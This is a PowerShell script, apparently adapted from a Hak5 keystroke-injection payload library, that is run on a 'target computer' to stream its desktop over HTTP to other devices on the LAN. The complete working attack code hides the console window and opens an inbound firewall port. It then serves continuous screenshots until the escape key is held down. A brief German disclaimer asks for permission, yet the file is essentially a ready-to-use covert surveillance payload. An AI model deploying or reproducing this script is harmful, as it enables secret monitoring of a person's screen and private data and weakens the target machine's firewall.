<#
================================================= Beigeworm's Screen Stream over HTTP ==========================================================

SYNOPSIS
Start up a HTTP server and stream the desktop to a browser window on another device on the LAN.

USAGE
1. Run this script on target computer and note the URL provided
2. on another device on the same network, enter the provided URL in a browser window
3. Hold escape key on target for 5 seconds to exit screenshare.

DIFFERENCES TO THE OFFICIAL HAK5 PAYLOAD (payloads/library/recon/Screenshare-Over-LAN)
  * IP-Erkennung robust (Standard-Route statt Regex 'Wi*'/'Eth*')
  * Firewall-Regel wird vor dem Anlegen bereinigt (kein Duplikat-Fehler)
  * Fallback auf http://+:PORT/ wenn keine IP ermittelt werden kann
  * $hide / $port sind oben konfigurierbar

WICHTIG: Nur auf Systemen einsetzen, die dir gehoeren bzw. fuer die du eine
ausdrueckliche Erlaubnis hast.
#>

# Hide the powershell console (1 = yes, 0 = nein -> Fenster bleibt sichtbar)
$hide = 1

# Port: wird vom DuckyScript gesetzt; 0 = automatisch 8080
$port = 8080

[Console]::BackgroundColor = "Black"
Clear-Host
[Console]::SetWindowSize(88,30)
[Console]::Title = "HTTP Screenshare"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Define port number
if ($port.length -lt 1){
    Write-Host "Using default port.. (8080)" -ForegroundColor Green
    $port = 8080
}

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray

# --- Robust: IP des Interfaces mit der Standardroute ermitteln -------------
$localIP = $null
try {
    $ifAlias = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
                Sort-Object -Property RouteMetric |
                Select-Object -First 1).InterfaceAlias
} catch {
    $ifAlias = $null
}

if ($ifAlias) {
    Write-Output "Primary interface: $ifAlias"
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $ifAlias -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}

if (-not $localIP) {
    # Fallback: erste brauchbare IPv4-Adresse
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}

if ($localIP) {
    Write-Output "Using IP address: $localIP"
} else {
    Write-Output "No IP address found - binding to all interfaces."
}

# --- Firewall: bestehende Regel entfernen, dann neu anlegen -----------------
Get-NetFirewallRule -DisplayName "AllowWebServer" -ErrorAction SilentlyContinue |
    Remove-NetFirewallRule -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -ErrorAction SilentlyContinue | Out-Null

# --- HttpListener ----------------------------------------------------------
$webServer = New-Object System.Net.HttpListener
if ($localIP) {
    $webServer.Prefixes.Add("http://${localIP}:${port}/")
    $webServer.Prefixes.Add("http://localhost:${port}/")
} else {
    # Kein spezifischer Host -> alle Interfaces
    $webServer.Prefixes.Add("http://+:${port}/")
}
$webServer.Start()

if ($localIP) {
    Write-Host ("Network Devices Can Reach the server at : http://"+$localIP+":"+$port)
} else {
    Write-Host ("Server listening on all interfaces, port : "+$port) -ForegroundColor Cyan
}
Write-Host "Press escape key for 5 seconds to exit" -f Cyan

# Code to hide the console on Windows 10 and 11
if ($hide -eq 1){
    Write-Host "Hiding this window.." -f Yellow
    sleep 4
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle

    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Escape to exit key detection
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
$VK_ESCAPE = 0x1B
$startTime = $null

while ($true) {
    try {
        $context = $webServer.GetContext()
        $response = $context.Response
        if ($context.Request.RawUrl -eq "/stream") {
            $response.ContentType = "multipart/x-mixed-replace; boundary=frame"
            $response.Headers.Add("Cache-Control", "no-cache")
            $boundary = "--frame"

            while ($context.Response.OutputStream.CanWrite) {
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)

                $stream = New-Object System.IO.MemoryStream
                $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
                $bitmap.Dispose()
                $graphics.Dispose()

                $bytes = $stream.ToArray()
                $stream.Dispose()

                $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/png`r`nContent-Length: $($bytes.Length)`r`n`r`n")
                $response.OutputStream.Write($writer, 0, $writer.Length)
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
                $boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")
                $response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)

                Start-Sleep -Milliseconds 33

                # Check for the escape key press to exit
                $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0
                if ($isEscapePressed) {
                    if (-not $startTime) {
                        $startTime = Get-Date
                    }
                    $elapsedTime = (Get-Date) - $startTime
                    if ($elapsedTime.TotalSeconds -ge 5) {
                        (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)
                        sleep 1
                        exit
                    }
                } else {
                    $startTime = $null
                }

            }
        } else {
            $response.ContentType = "text/html"
            $html = @"
            <!DOCTYPE html>
            <html>
            <head>
                <title>Streaming Video</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {
                    background-color: black;
                    margin: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                img {
                    width: 90vw;
                    height: auto;
                    max-width: 100%;
                    max-height: 100%;
                }
            </style>
            </head>
            <body>
                <img src='/stream' alt='Streaming Video' />
            </body>
            </html>
"@
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        }
        $response.Close()
    } catch {
        Write-Host "Error encountered: $_"
    }
}
$webServer.Stop()
